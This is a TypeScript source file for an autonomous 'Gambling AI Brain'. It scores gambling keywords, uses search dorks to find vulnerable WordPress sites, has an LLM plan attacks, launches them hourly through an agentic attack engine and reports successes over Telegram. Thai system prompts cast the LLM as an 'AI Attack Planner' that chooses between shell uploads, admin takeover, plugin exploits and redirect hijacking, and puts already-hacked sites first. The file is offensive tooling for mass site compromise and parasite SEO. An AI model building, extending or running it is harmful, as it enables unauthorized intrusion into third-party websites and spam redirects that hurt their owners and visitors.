/**
 * Gambling AI Brain — Fully Autonomous End-to-End Controller
 * 
 * The "brain" that connects ALL subsystems into a single autonomous loop:
 *   1. Keyword Intelligence → discovers high-value gambling keywords
 *   2. Smart Target Discovery → finds vulnerable sites for those keywords
 *   3. Attack Strategy → selects optimal attack method per target
 *   4. Attack Execution → runs the actual attack via agentic engine
 *   5. Verification → confirms success
 *   6. Learning → feeds results back to improve future cycles
 * 
 * Runs autonomously in background — no user intervention needed.
 * Reports progress via Telegram notifications.
 */
import { getDb } from "./db";
import { agenticSessions, serpDiscoveredTargets, serpKeywords, hackedSiteDetections } from "../drizzle/schema";
import { eq, sql, and, desc, gt, lt, or, ne, isNull } from "drizzle-orm";
import { invokeLLMWithFallback } from "./llm-fallback";
import {
  getAllGamblingKeywords,
  scoreKeywords,
  expandKeywords,
  discoverKeywordsFromSerp,
  seedGamblingKeywords,
  type KeywordScore,
} from "./gambling-keyword-intel";
import {
  runSmartGamblingDiscovery,
  selectNextAttackTargets,
  scoreTargetsForGambling,
  getSmartDiscoveryStats,
  analyzeCompetitorTargets,
  type GamblingTargetScore,
  type SmartDiscoveryResult,
} from "./smart-target-discovery";
import {
  startAgenticSession,
  getAgenticSessionStatus,
  stopAgenticSession,
  pickRedirectUrl,
  getRedirectUrls,
  type AgenticConfig,
} from "./agentic-attack-engine";
import { sendTelegramNotification } from "./telegram-notifier";

// ═══════════════════════════════════════════════════════
//  TYPES
// ═══════════════════════════════════════════════════════

export interface GamblingBrainConfig {
  // Keyword settings
  maxKeywordsPerCycle: number;     // How many keywords to process per cycle
  expandKeywords: boolean;          // Use AI to expand keyword list
  // Discovery settings
  maxDorksPerCycle: number;         // How many dork queries per cycle
  maxTargetsPerCycle: number;       // Max targets to discover per cycle
  includeCompetitorScan: boolean;   // Scan competitor domains
  competitorDomains: string[];      // Known competitor domains to analyze
  // Attack settings
  maxAttacksPerCycle: number;       // Max attacks to execute per cycle
  attackMode: "full_auto" | "discovery_and_attack" | "discovery_only";
  targetCms: string[];              // Preferred CMS targets
  // Timing
  delayBetweenAttacks: number;      // ms between attacks (rate limiting)
  // Notifications
  notifyOnDiscovery: boolean;
  notifyOnAttackSuccess: boolean;
  notifyOnCycleComplete: boolean;
}

export interface BrainCycleResult {
  cycleId: string;
  startedAt: number;
  completedAt: number;
  duration: number;
  // Keyword phase
  keywordsProcessed: number;
  newKeywordsDiscovered: number;
  topKeywords: string[];
  // Discovery phase
  targetsDiscovered: number;
  highPriorityTargets: number;
  alreadyHackedFound: number;
  // Attack phase
  attacksLaunched: number;
  attacksSucceeded: number;
  attacksFailed: number;
  // Overall
  status: "completed" | "partial" | "error";
  errors: string[];
  summary: string;
}

export interface BrainState {
  isRunning: boolean;
  currentCycleId: string | null;
  currentPhase: "idle" | "keywords" | "discovery" | "scoring" | "attacking" | "verifying" | "learning";
  phaseDetail: string;
  progress: number; // 0-100
  lastCycleResult: BrainCycleResult | null;
  totalCyclesCompleted: number;
  totalAttacksLaunched: number;
  totalSuccesses: number;
  startedAt: number | null;
}

// ═══════════════════════════════════════════════════════
//  BRAIN STATE (in-memory singleton)
// ═══════════════════════════════════════════════════════

let brainState: BrainState = {
  isRunning: false,
  currentCycleId: null,
  currentPhase: "idle",
  phaseDetail: "",
  progress: 0,
  lastCycleResult: null,
  totalCyclesCompleted: 0,
  totalAttacksLaunched: 0,
  totalSuccesses: 0,
  startedAt: null,
};

export function getBrainState(): BrainState {
  return { ...brainState };
}

// ═══════════════════════════════════════════════════════
//  DEFAULT CONFIG
// ═══════════════════════════════════════════════════════

const DEFAULT_CONFIG: GamblingBrainConfig = {
  maxKeywordsPerCycle: 20,
  expandKeywords: true,
  maxDorksPerCycle: 8,
  maxTargetsPerCycle: 30,
  includeCompetitorScan: true,
  competitorDomains: [],
  maxAttacksPerCycle: 5,
  attackMode: "full_auto",
  targetCms: ["wordpress"],
  delayBetweenAttacks: 30000, // 30s between attacks
  notifyOnDiscovery: true,
  notifyOnAttackSuccess: true,
  notifyOnCycleComplete: true,
};

// ═══════════════════════════════════════════════════════
//  MAIN BRAIN CYCLE
// ═══════════════════════════════════════════════════════

export async function runBrainCycle(config: Partial<GamblingBrainConfig> = {}): Promise<BrainCycleResult> {
  const cfg = { ...DEFAULT_CONFIG, ...config };
  const cycleId = `brain_${Date.now()}_${Math.random().toString(36).slice(2, 6)}`;
  const startTime = Date.now();
  
  const result: BrainCycleResult = {
    cycleId,
    startedAt: startTime,
    completedAt: 0,
    duration: 0,
    keywordsProcessed: 0,
    newKeywordsDiscovered: 0,
    topKeywords: [],
    targetsDiscovered: 0,
    highPriorityTargets: 0,
    alreadyHackedFound: 0,
    attacksLaunched: 0,
    attacksSucceeded: 0,
    attacksFailed: 0,
    status: "completed",
    errors: [],
    summary: "",
  };
  
  brainState = {
    ...brainState,
    isRunning: true,
    currentCycleId: cycleId,
    currentPhase: "keywords",
    phaseDetail: "Starting gambling AI brain cycle...",
    progress: 0,
    startedAt: startTime,
  };
  
  try {
    // ═══════════════════════════════════════════════════
    // PHASE 1: KEYWORD INTELLIGENCE
    // ═══════════════════════════════════════════════════
    updatePhase("keywords", "🔑 Phase 1: Discovering high-value gambling keywords...", 5);
    
    // Get all gambling keywords
    const allKeywords = getAllGamblingKeywords();
    result.keywordsProcessed = allKeywords.length;
    
    // Score keywords with AI
    let scoredKeywords: KeywordScore[] = [];
    try {
      scoredKeywords = await scoreKeywords(allKeywords.slice(0, cfg.maxKeywordsPerCycle));
      result.topKeywords = scoredKeywords
        .sort((a, b) => b.priorityScore - a.priorityScore)
        .slice(0, 10)
        .map(k => k.keyword);
    } catch (e: any) {
      result.errors.push(`Keyword scoring: ${e.message}`);
    }
    
    // Expand keywords with AI
    if (cfg.expandKeywords) {
      try {
        const expanded = await expandKeywords(result.topKeywords.slice(0, 5));
        result.newKeywordsDiscovered = (expanded.newKeywords?.length || 0) + (expanded.trendingKeywords?.length || 0);
        
        // Also discover from SERP
        for (const kw of result.topKeywords.slice(0, 3)) {
          const serpKws = await discoverKeywordsFromSerp(kw);
          result.newKeywordsDiscovered += serpKws.length;
          await sleep(2000);
        }
      } catch (e: any) {
        result.errors.push(`Keyword expansion: ${e.message}`);
      }
    }
    
    // Sync to DB
    try {
      await seedGamblingKeywords();
    } catch (e: any) {
      result.errors.push(`Keyword sync: ${e.message}`);
    }
    
    updatePhase("keywords", `✅ Phase 1 complete: ${result.keywordsProcessed} keywords, ${result.newKeywordsDiscovered} new discovered`, 15);
    
    // ═══════════════════════════════════════════════════
    // PHASE 2: SMART TARGET DISCOVERY
    // ═══════════════════════════════════════════════════
    updatePhase("discovery", "🎯 Phase 2: Finding vulnerable targets for gambling SEO...", 20);
    
    let discoveryResult: SmartDiscoveryResult | null = null;
    try {
      discoveryResult = await runSmartGamblingDiscovery({
        maxDorks: cfg.maxDorksPerCycle,
        maxTargets: cfg.maxTargetsPerCycle,
        includeAlreadyHacked: true,
        onProgress: (phase, detail, progress) => {
          updatePhase("discovery", `🎯 ${detail}`, 20 + (progress * 0.2));
        },
      });
      
      result.targetsDiscovered = discoveryResult.totalUniqueTargets;
      result.highPriorityTargets = discoveryResult.totalHighPriority;
      result.alreadyHackedFound = discoveryResult.totalAlreadyHacked;
    } catch (e: any) {
      result.errors.push(`Discovery: ${e.message}`);
    }
    
    // Competitor analysis
    if (cfg.includeCompetitorScan && cfg.competitorDomains.length > 0) {
      for (const competitor of cfg.competitorDomains.slice(0, 3)) {
        try {
          const compResult = await analyzeCompetitorTargets(competitor);
          result.targetsDiscovered += compResult.targetsFound.length;
          updatePhase("discovery", `🕵️ Competitor ${competitor}: found ${compResult.targetsFound.length} targets`, 40);
          await sleep(2000);
        } catch (e: any) {
          result.errors.push(`Competitor scan ${competitor}: ${e.message}`);
        }
      }
    }
    
    if (cfg.notifyOnDiscovery && result.targetsDiscovered > 0) {
      await sendTelegramNotification({
        type: "info",
        targetUrl: "gambling-brain",
        details: `🎯 GAMBLING BRAIN — DISCOVERY COMPLETE\n\n` +
          `🔑 Keywords: ${result.keywordsProcessed} (${result.newKeywordsDiscovered} new)\n` +
          `🎯 Targets found: ${result.targetsDiscovered}\n` +
          `⚡ High priority: ${result.highPriorityTargets}\n` +
          `🔓 Already hacked: ${result.alreadyHackedFound}\n` +
          `📊 Top keywords: ${result.topKeywords.slice(0, 5).join(", ")}`,
      }).catch(() => {});
    }
    
    updatePhase("discovery", `✅ Phase 2 complete: ${result.targetsDiscovered} targets, ${result.highPriorityTargets} high priority`, 45);
    
    // ═══════════════════════════════════════════════════
    // PHASE 3: AI ATTACK STRATEGY
    // ═══════════════════════════════════════════════════
    if (cfg.attackMode === "discovery_only") {
      result.summary = `Discovery only: ${result.targetsDiscovered} targets found, ${result.highPriorityTargets} high priority`;
      result.completedAt = Date.now();
      result.duration = Date.now() - startTime;
      brainState.lastCycleResult = result;
      brainState.totalCyclesCompleted++;
      brainState.isRunning = false;
      brainState.currentPhase = "idle";
      return result;
    }
    
    updatePhase("scoring", "🧠 Phase 3: AI selecting optimal attack targets and methods...", 50);
    
    // Select best targets to attack
    const attackTargets = await selectNextAttackTargets(cfg.maxAttacksPerCycle);
    
    if (attackTargets.length === 0) {
      updatePhase("scoring", "⚠️ No suitable targets found for attack", 55);
      result.summary = `No attackable targets found. Discovery: ${result.targetsDiscovered} targets`;
      result.completedAt = Date.now();
      result.duration = Date.now() - startTime;
      brainState.lastCycleResult = result;
      brainState.totalCyclesCompleted++;
      brainState.isRunning = false;
      brainState.currentPhase = "idle";
      return result;
    }
    
    // Use AI to plan the attack sequence
    let attackPlan: Array<{
      domain: string;
      url: string;
      method: string;
      keywords: string[];
      reasoning: string;
    }> = [];
    
    try {
      attackPlan = await planAttackSequence(attackTargets, result.topKeywords);
    } catch (e: any) {
      // Fallback: use targets as-is
      attackPlan = attackTargets.map(t => ({
        domain: t.domain,
        url: t.url,
        method: t.recommendedMethod,
        keywords: result.topKeywords.slice(0, 5),
        reasoning: t.reasoning,
      }));
    }
    
    updatePhase("scoring", `✅ Phase 3 complete: ${attackPlan.length} attacks planned`, 55);
    
    // ═══════════════════════════════════════════════════
    // PHASE 4: EXECUTE ATTACKS
    // ═══════════════════════════════════════════════════
    updatePhase("attacking", `⚔️ Phase 4: Executing ${attackPlan.length} attacks...`, 60);
    
    const redirectUrls = await getRedirectUrls();
    
    for (let i = 0; i < attackPlan.length; i++) {
      const target = attackPlan[i];
      
      if (!brainState.isRunning) {
        result.errors.push("Brain stopped by user");
        break;
      }
      
      updatePhase("attacking", `⚔️ Attack ${i + 1}/${attackPlan.length}: ${target.domain} (${target.method})`, 60 + (i / attackPlan.length) * 25);
      
      try {
        const redirectUrl = await pickRedirectUrl(redirectUrls);
        
        const agenticConfig: AgenticConfig = {
          userId: 0, // system user
          mode: "full_auto",
          maxTargetsPerRun: 1,
          maxRetriesPerTarget: 3,
          targetCms: [target.method.includes("wp") ? "wordpress" : "any"],
          customDorks: [`site:${target.domain}`],
          seoKeywords: target.keywords,
          redirectUrls: [redirectUrl],
        };
        
        const { sessionId } = await startAgenticSession(agenticConfig);
        result.attacksLaunched++;
        brainState.totalAttacksLaunched++;
        
        // Wait for attack to complete (poll status)
        const attackResult = await waitForAttackCompletion(sessionId, 300000);
        
        if (attackResult.success) {
          result.attacksSucceeded++;
          brainState.totalSuccesses++;
          
          if (cfg.notifyOnAttackSuccess) {
            await sendTelegramNotification({
              type: "success",
              targetUrl: target.url,
              redirectUrl,
              keywords: target.keywords.slice(0, 3),
              details: `🧠 GAMBLING BRAIN — ATTACK SUCCESS!\nMethod: ${target.method}\nReasoning: ${target.reasoning}`,
            }).catch(() => {});
          }
          
          // Update target status in DB
          await updateTargetStatusInDb(target.domain, "success");
        } else {
          result.attacksFailed++;
          await updateTargetStatusInDb(target.domain, "failed");
        }
        
        // Rate limit between attacks
        if (i < attackPlan.length - 1) {
          await sleep(cfg.delayBetweenAttacks);
        }
        
      } catch (e: any) {
        result.attacksFailed++;
        result.errors.push(`Attack ${target.domain}: ${e.message}`);
      }
    }
    
    updatePhase("attacking", `✅ Phase 4 complete: ${result.attacksSucceeded}/${result.attacksLaunched} successful`, 85);
    
    // ═══════════════════════════════════════════════════
    // PHASE 5: LEARNING & SUMMARY
    // ═══════════════════════════════════════════════════
    updatePhase("learning", "📚 Phase 5: Feeding results back for learning...", 90);
    
    // Generate AI summary of the cycle
    try {
      result.summary = await generateCycleSummary(result);
    } catch {
      result.summary = `Cycle ${cycleId}: ${result.keywordsProcessed} keywords, ${result.targetsDiscovered} targets, ${result.attacksLaunched} attacks (${result.attacksSucceeded} success, ${result.attacksFailed} failed)`;
    }
    
    // Notify cycle complete
    if (cfg.notifyOnCycleComplete) {
      await sendTelegramNotification({
        type: "info",
        targetUrl: "gambling-brain",
        details: `🧠 GAMBLING AI BRAIN — CYCLE COMPLETE\n\n` +
          `🔑 Keywords: ${result.keywordsProcessed} (${result.newKeywordsDiscovered} new)\n` +
          `🎯 Targets: ${result.targetsDiscovered} (${result.highPriorityTargets} high priority)\n` +
          `⚔️ Attacks: ${result.attacksLaunched} (✅ ${result.attacksSucceeded} / ❌ ${result.attacksFailed})\n` +
          `⏱️ Duration: ${Math.round((Date.now() - startTime) / 1000)}s\n\n` +
          `📝 ${result.summary}`,
      }).catch(() => {});
    }
    
    result.status = result.errors.length > 0 ? "partial" : "completed";
    
  } catch (e: any) {
    result.status = "error";
    result.errors.push(`Brain cycle error: ${e.message}`);
    
    await sendTelegramNotification({
      type: "info",
      targetUrl: "gambling-brain",
      errors: [e.message],
      details: `❌ GAMBLING AI BRAIN — CYCLE ERROR\nPhase: ${brainState.currentPhase}\nDuration: ${Math.round((Date.now() - startTime) / 1000)}s`,
    }).catch(() => {});
  }
  
  result.completedAt = Date.now();
  result.duration = Date.now() - startTime;
  
  brainState = {
    ...brainState,
    isRunning: false,
    currentPhase: "idle",
    phaseDetail: result.summary,
    progress: 100,
    lastCycleResult: result,
    totalCyclesCompleted: brainState.totalCyclesCompleted + 1,
  };
  
  return result;
}

// ═══════════════════════════════════════════════════════
//  AI ATTACK PLANNER
// ═══════════════════════════════════════════════════════

async function planAttackSequence(
  targets: Array<{ domain: string; url: string; priority: number; recommendedMethod: string; reasoning: string }>,
  topKeywords: string[],
): Promise<Array<{ domain: string; url: string; method: string; keywords: string[]; reasoning: string }>> {
  try {
    const response = await invokeLLMWithFallback({
      messages: [
        {
          role: "system",
          content: `คุณเป็น AI Attack Planner สำหรับ Gambling Parasite SEO
วางแผนการโจมตีเป้าหมายแต่ละตัว:
- เลือก method ที่เหมาะสมที่สุด (redirect_takeover, shell_upload, wp_admin, plugin_exploit, shellless_redirect)
- เลือก keywords ที่เหมาะกับแต่ละ target (เว็บกีฬา → keywords แทงบอล, เว็บทั่วไป → keywords สล็อต)
- จัดลำดับการโจมตี: already-hacked ก่อน, แล้ว high-DA, แล้ว easy targets
- ให้เหตุผลสั้นๆ ว่าทำไมถึงเลือก method นี้`
        },
        {
          role: "user",
          content: `วางแผนโจมตี targets เหล่านี้:\n${targets.map((t, i) => 
            `${i + 1}. ${t.domain} (priority: ${t.priority}, recommended: ${t.recommendedMethod})\n   ${t.reasoning}`
          ).join("\n")}\n\nAvailable keywords: ${topKeywords.join(", ")}`
        }
      ],
      response_format: {
        type: "json_schema",
        json_schema: {
          name: "attack_plan",
          strict: true,
          schema: {
            type: "object",
            properties: {
              attacks: {
                type: "array",
                items: {
                  type: "object",
                  properties: {
                    domain: { type: "string" },
                    url: { type: "string" },
                    method: { type: "string" },
                    keywords: { type: "array", items: { type: "string" } },
                    reasoning: { type: "string" },
                  },
                  required: ["domain", "url", "method", "keywords", "reasoning"],
                  additionalProperties: false,
                },
              },
            },
            required: ["attacks"],
            additionalProperties: false,
          },
        },
      },
    });
    
    const content = response.choices?.[0]?.message?.content;
    if (content && typeof content === "string") {
      const parsed = JSON.parse(content);
      return parsed.attacks || [];
    }
  } catch (e) {
    console.error("[GamblingBrain] Attack planning failed:", e);
  }
  
  // Fallback: use targets as-is
  return targets.map(t => ({
    domain: t.domain,
    url: t.url,
    method: t.recommendedMethod,
    keywords: topKeywords.slice(0, 5),
    reasoning: t.reasoning,
  }));
}

// ═══════════════════════════════════════════════════════
//  AI CYCLE SUMMARY
// ═══════════════════════════════════════════════════════

async function generateCycleSummary(result: BrainCycleResult): Promise<string> {
  try {
    const response = await invokeLLMWithFallback({
      messages: [
        {
          role: "system",
          content: "สรุปผลการทำงานของ Gambling AI Brain ในรอบนี้ เป็นภาษาไทยสั้นๆ 2-3 ประโยค เน้นผลลัพธ์ที่สำคัญ"
        },
        {
          role: "user",
          content: JSON.stringify({
            keywords: result.keywordsProcessed,
            newKeywords: result.newKeywordsDiscovered,
            topKeywords: result.topKeywords,
            targets: result.targetsDiscovered,
            highPriority: result.highPriorityTargets,
            alreadyHacked: result.alreadyHackedFound,
            attacks: result.attacksLaunched,
            successes: result.attacksSucceeded,
            failures: result.attacksFailed,
            errors: result.errors.length,
            duration: Math.round(result.duration / 1000),
          }),
        }
      ],
    });
    
    const content = response.choices?.[0]?.message?.content;
    if (content && typeof content === "string") return content;
  } catch {}
  
  return `Processed ${result.keywordsProcessed} keywords, found ${result.targetsDiscovered} targets, launched ${result.attacksLaunched} attacks (${result.attacksSucceeded} success)`;
}

// ═══════════════════════════════════════════════════════
//  HELPERS
// ═══════════════════════════════════════════════════════

function updatePhase(phase: BrainState["currentPhase"], detail: string, progress: number) {
  brainState = {
    ...brainState,
    currentPhase: phase,
    phaseDetail: detail,
    progress,
  };
}

async function waitForAttackCompletion(sessionId: number, timeoutMs: number): Promise<{ success: boolean; details: string }> {
  const startTime = Date.now();
  const pollInterval = 10000; // 10s
  
  while (Date.now() - startTime < timeoutMs) {
    try {
      const status = await getAgenticSessionStatus(sessionId);
      if (!status) return { success: false, details: "Session not found" };
      
      if (status.status === "completed") {
        const successCount = status.targetsSucceeded || 0;
        return {
          success: successCount > 0,
          details: `Completed: ${successCount} success, ${status.targetsFailed || 0} failed`,
        };
      }
      
      if (status.status === "error" || status.status === "stopped") {
        return { success: false, details: `Session ${status.status}` };
      }
      
      await sleep(pollInterval);
    } catch (e: any) {
      return { success: false, details: `Poll error: ${e.message}` };
    }
  }
  
  // Timeout — stop the session
  try {
    await stopAgenticSession(sessionId);
  } catch {}
  return { success: false, details: "Timeout" };
}

async function updateTargetStatusInDb(domain: string, status: "success" | "failed") {
  try {
    const db = await getDb();
    if (!db) return;
    
    const [target] = await db.select({ id: serpDiscoveredTargets.id })
      .from(serpDiscoveredTargets)
      .where(eq(serpDiscoveredTargets.domain, domain))
      .limit(1);
    
    if (target) {
      await db.update(serpDiscoveredTargets)
        .set({ status })
        .where(eq(serpDiscoveredTargets.id, target.id));
    }
  } catch {}
}

export function stopBrain() {
  brainState.isRunning = false;
  brainState.phaseDetail = "Stopped by user";
}

function sleep(ms: number): Promise<void> {
  return new Promise(resolve => setTimeout(resolve, ms));
}

// ═══════════════════════════════════════════════════════
//  CONTINUOUS AUTONOMOUS MODE
// ═══════════════════════════════════════════════════════

let continuousInterval: ReturnType<typeof setTimeout> | null = null;

/**
 * Start the brain in continuous mode — runs cycles indefinitely
 * with configurable interval between cycles
 */
export async function startContinuousMode(
  config: Partial<GamblingBrainConfig> = {},
  intervalMs: number = 3600000, // 1 hour default
): Promise<void> {
  if (continuousInterval) {
    console.log("[GamblingBrain] Already running in continuous mode");
    return;
  }
  
  console.log(`[GamblingBrain] Starting continuous mode (interval: ${intervalMs / 1000}s)`);
  
  await sendTelegramNotification({
    type: "info",
    targetUrl: "gambling-brain",
    details: `🧠 GAMBLING AI BRAIN — CONTINUOUS MODE STARTED\n\n` +
      `⏱️ Interval: ${Math.round(intervalMs / 60000)} minutes\n` +
      `⚔️ Mode: ${config.attackMode || DEFAULT_CONFIG.attackMode}\n` +
      `🎯 Max attacks/cycle: ${config.maxAttacksPerCycle || DEFAULT_CONFIG.maxAttacksPerCycle}`,
  }).catch(() => {});
  
  // Run first cycle immediately
  runBrainCycle(config).catch(e => {
    console.error("[GamblingBrain] Cycle error:", e);
  });
  
  // Schedule subsequent cycles
  continuousInterval = setInterval(async () => {
    if (brainState.isRunning) {
      console.log("[GamblingBrain] Previous cycle still running, skipping...");
      return;
    }
    
    try {
      await runBrainCycle(config);
    } catch (e) {
      console.error("[GamblingBrain] Cycle error:", e);
    }
  }, intervalMs);
}

export function stopContinuousMode() {
  if (continuousInterval) {
    clearInterval(continuousInterval);
    continuousInterval = null;
  }
  stopBrain();
  
  sendTelegramNotification({
    type: "info",
    targetUrl: "gambling-brain",
    details: `🛑 GAMBLING AI BRAIN — CONTINUOUS MODE STOPPED\n\n` +
      `📊 Total cycles: ${brainState.totalCyclesCompleted}\n` +
      `⚔️ Total attacks: ${brainState.totalAttacksLaunched}\n` +
      `✅ Total successes: ${brainState.totalSuccesses}`,
  }).catch(() => {});
}

export function isContinuousModeRunning(): boolean {
  return continuousInterval !== null;
}
